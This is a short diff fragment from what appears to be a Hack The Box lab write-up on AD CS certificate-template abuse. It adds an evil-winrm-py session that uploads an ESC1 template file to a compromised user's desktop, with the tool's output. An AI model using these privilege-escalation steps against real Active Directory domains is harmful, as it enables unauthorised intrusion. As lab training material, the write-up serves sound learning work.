@@ -1028,6 +1028,15 @@ https://github.com/Orange-Cyberdefense/GOAD/blob/main/ansible/roles/adcs_templat
 Instead of creating my own and possibly missing something ill use this which i found 
 
 ```python
+evil-winrm-py PS C:\Users\e.black\Desktop> upload ESC1.json
+Uploading /home/kali/htb/coder/ESC1.json: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 4.15k/4.15k [00:00<00:00, 64.8kB/s]
+[+] File uploaded successfully as: C:\Users\e.black\Desktop\ESC1.json
+evil-winrm-py PS C:\Users\e.black\Desktop>
+```
+
+Ill upload it
+
+```python
 
 ```
 
